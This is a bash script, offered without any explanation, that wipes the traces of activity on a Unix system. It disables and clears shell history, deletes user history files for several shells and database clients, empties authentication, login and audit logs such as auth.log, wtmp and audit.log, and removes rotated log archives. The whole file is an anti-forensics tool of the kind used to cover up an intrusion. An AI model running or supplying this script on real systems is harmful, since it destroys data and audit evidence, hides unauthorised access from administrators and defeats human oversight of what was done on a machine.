#!/bin/bash
# Disable and minimize history
unset HISTFILE
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
set +o history

# Clear in-memory shell history
history -c

# Remove user history files
rm -f ~/.bash_history
rm -f ~/.zsh_history
rm -f ~/.mysql_history
rm -f ~/.psql_history
rm -f ~/.viminfo
rm -f ~/.lesshst

# Remove system logs (requires root)
LOGS=(
    /var/log/wtmp
    /var/log/btmp
    /var/log/lastlog
    /var/log/auth.log
    /var/log/secure
    /var/log/syslog
    /var/log/messages
    /var/log/faillog
    /var/log/kern.log
    /var/log/audit/audit.log
    /var/log/utmp
)

for LOG in "${LOGS[@]}"; do
    [ -f "$LOG" ] && cat /dev/null > "$LOG"
done

# Optional: remove rotated/compressed logs
rm -f /var/log/*.gz
rm -f /var/log/*.[0-9]
rm -f /var/log/**/*.[0-9] 2>/dev/null
rm -f /var/log/**/*.gz 2>/dev/null
